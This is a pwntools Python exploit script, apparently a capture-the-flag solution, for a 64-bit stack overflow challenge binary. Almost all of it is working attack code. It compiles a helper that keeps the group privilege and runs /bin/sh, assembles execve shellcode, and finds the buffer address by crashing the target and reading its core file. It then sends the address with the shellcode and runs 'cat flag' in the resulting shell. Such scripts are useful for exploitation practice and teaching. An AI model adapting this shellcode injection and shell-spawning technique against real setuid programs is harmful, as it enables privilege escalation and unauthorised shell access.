from pwn import *
import os

DEBUG = False 
file = "./stack-ovfl-where-64-2"

context.arch = 'x86-64'

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
mov    rsi,0x0
mov    rdx,0x0
mov    rax,0x3b

push   0x0
push   0x7a
mov    rdi,rsp

syscall
''')

env = {"PATH":"$PATH:."}

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
heap_addr = next(core.search(cyclic(10)))
print(hex(heap_addr))
os.unlink(core.path)
    
# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

payload = hex(heap_addr + 9).encode('utf8') + b'_' + shellcode
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Where', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
